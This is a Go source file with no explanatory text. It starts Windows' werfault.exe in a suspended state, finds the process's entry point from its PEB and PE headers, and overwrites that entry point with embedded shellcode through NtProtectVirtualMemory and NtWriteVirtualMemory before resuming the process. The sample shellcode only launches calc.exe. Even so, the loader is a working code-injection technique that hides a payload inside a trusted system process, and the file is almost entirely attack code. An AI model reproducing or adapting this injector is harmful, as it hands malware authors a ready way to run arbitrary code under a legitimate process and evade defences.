package main

import (
	"debug/pe"
	"encoding/binary"
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)

//IMAGE_NT_HEADERS64 type
type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     pe.FileHeader
	OptionalHeader pe.OptionalHeader64
}



type ImageDosHeader struct {
	E_magic uint16
	E_cblp uint16
	E_cp uint16
	E_crlc uint16
	E_cparhdr uint16
	Eminalloc uint16
	E_maxalloc uint16
	E_ss uint16
	E_sp uint16
	E_csum uint16
	Eip uint16
	E_cs uint16
	E_lfarlc uint16
	E_ovno uint16
	E_res []uint16
	E_oemid uint16
	E_oeminfo uint16
	E_res2 []uint16
	E_lfanew uint32
}
type PImageDosHeader *ImageDosHeader

func NewImageDosHeader(data []byte) *ImageDosHeader {
	image_dos_header := new(ImageDosHeader)
	image_dos_header.Parse(data)
	return image_dos_header
}

func (h *ImageDosHeader) Parse(data []byte) {
	h.E_magic = binary.LittleEndian.Uint16(data[0:2])
	h.E_cblp = binary.LittleEndian.Uint16(data[2:4])
	h.E_cp = binary.LittleEndian.Uint16(data[4:6])
	h.E_crlc = binary.LittleEndian.Uint16(data[6:8])
	h.E_cparhdr = binary.LittleEndian.Uint16(data[8:10])
	h.Eminalloc = binary.LittleEndian.Uint16(data[10:12])
	h.E_maxalloc = binary.LittleEndian.Uint16(data[12:14])
	h.E_ss = binary.LittleEndian.Uint16(data[14:16])
	h.E_sp = binary.LittleEndian.Uint16(data[16:18])
	h.E_csum = binary.LittleEndian.Uint16(data[18:20])
	h.Eip = binary.LittleEndian.Uint16(data[20:22])
	h.E_cs = binary.LittleEndian.Uint16(data[22:24])
	h.E_lfarlc = binary.LittleEndian.Uint16(data[24:26])
	h.E_ovno = binary.LittleEndian.Uint16(data[26:28])
	for i := 0; i < 8; i+=2 {
		h.E_res = append(
			h.E_res,
			binary.LittleEndian.Uint16(data[28+i:30+i]),
		)
	}

	h.E_oemid = binary.LittleEndian.Uint16(data[36:38])
	h.E_oeminfo = binary.LittleEndian.Uint16(data[38:40])
	for i := 0; i < 20; i+=2 {
		h.E_res2 = append(
			h.E_res2,
			binary.LittleEndian.Uint16(data[40+i:42+i]),
		)
	}
	h.E_lfanew = binary.LittleEndian.Uint32(data[60:64])
}




var shellcode = []byte{
	//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
	0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
	0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
	0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
	0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
	0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
	0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
	0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
	0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
	0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
	0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
	0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
	0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
	0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
	0xd7,
}


func main(){
	cmdline := "c:\\windows\\system32\\werfault.exe -u -p " + strconv.Itoa(os.Getpid())
	fmt.Println(cmdline)
	cmd := syscall.StringToUTF16Ptr(cmdline)
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	var info int32
	var pbi windows.PROCESS_BASIC_INFORMATION
	var returnLen uint32 = 0
	var SizeOfProcessBasicInformationStruct = unsafe.Sizeof(windows.PROCESS_BASIC_INFORMATION{})

	windows.CreateProcess(nil,cmd,nil,nil,false,windows.CREATE_SUSPENDED,nil,nil,&si,&pi)

	windows.NtQueryInformationProcess(pi.Process,info,unsafe.Pointer(&pbi),uint32(SizeOfProcessBasicInformationStruct),&returnLen)

	pebOffset:= uintptr(unsafe.Pointer(pbi.PebBaseAddress))+0x10

	var imageBase uintptr = 0
	k32 := syscall.NewLazyDLL("kernel32")
	ReadProcessMemory := k32.NewProc("ReadProcessMemory")

	ReadProcessMemory.Call(uintptr(pi.Process),pebOffset, uintptr(unsafe.Pointer(&imageBase)),8,0)

	headersBuffer := make([]byte,4096)

	ReadProcessMemory.Call(uintptr(pi.Process),imageBase,uintptr(unsafe.Pointer(&headersBuffer[0])),4096,0)

	h1:= fmt.Sprintf("0x%x", imageBase)
	fmt.Println("imageBase:",h1)
	h2:= fmt.Sprintf("0x%x", pebOffset)
	fmt.Println("pebOffset:",h2)
	h3:= fmt.Sprintf("0x%x", uintptr(unsafe.Pointer(&headersBuffer[0])))
	fmt.Println("headersBuffer:",h3)



	// get AddressOfEntryPoint
	//PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
	var dos_header PImageDosHeader
	dos_header = NewImageDosHeader(headersBuffer)

	//PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
	nt_Header := uintptr(unsafe.Pointer(&headersBuffer[0])) + uintptr(dos_header.E_lfanew)
	ntHeader := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(nt_Header))
	//LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)imageBase);
	codeEntry := uintptr(ntHeader.OptionalHeader.AddressOfEntryPoint)+imageBase

	h:= fmt.Sprintf("0x%x", codeEntry)
	fmt.Println("AddressOfEntryPoint:",h)

	//WriteProcessMemory := k32.NewProc("WriteProcessMemory")
	//WriteProcessMemory.Call(uintptr(pi.Process), codeEntry, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),0)

	NTWVM := syscall.NewLazyDLL("ntdll").NewProc("NtWriteVirtualMemory")
	NtProtectVirtualMemory := syscall.NewLazyDLL("ntdll").NewProc("NtProtectVirtualMemory")
	var old uintptr
	NtProtect(NtProtectVirtualMemory,uintptr(pi.Process),codeEntry,uintptr(len(shellcode)),syscall.PAGE_READWRITE,&old)

	NTWVM.Call(uintptr(pi.Process),codeEntry,uintptr(unsafe.Pointer(&shellcode[0])),uintptr(len(shellcode)),0)

	NtProtect(NtProtectVirtualMemory,uintptr(pi.Process),codeEntry,uintptr(len(shellcode)),syscall.PAGE_EXECUTE_READ,&old)

	windows.ResumeThread(pi.Thread)

}

func NtProtect(NtProtectVirtualMemory *syscall.LazyProc,pHndl uintptr,targetPtr uintptr, sSize uintptr,protect uintptr,oldProtect *uintptr)(uintptr,uintptr,error){
	r1,r2,lastErr := NtProtectVirtualMemory.Call(
		pHndl,
		uintptr(unsafe.Pointer((*uintptr)(unsafe.Pointer(&targetPtr)))),
		uintptr((unsafe.Pointer(&sSize))),
		protect,
		uintptr((unsafe.Pointer(oldProtect))),
	)
	return r1,r2,lastErr
}
